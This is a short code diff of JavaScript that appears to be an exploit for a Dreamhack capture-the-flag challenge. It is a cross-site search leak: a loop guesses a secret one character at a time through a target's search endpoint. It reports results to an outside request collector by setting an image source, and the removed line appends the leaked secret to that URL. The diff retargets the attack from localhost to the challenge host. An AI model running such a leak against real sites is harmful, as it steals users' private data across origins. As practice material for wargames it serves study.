@@ -16,7 +16,7 @@
     async function search(query) {
         try {
             await req(
-              `http://localhost:8000/search?query=${query}`
+              `http://host3.dreamhack.games:21831/search?query=${query}`
             );
             return true;
         } catch (e) {
@@ -30,7 +30,7 @@
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://wrrgpwo.request.dreamhack.games/${secret}`;
+                    img.src = `https://ikhyxfi.request.dreamhack.games`;
                     break;
                 }
             }
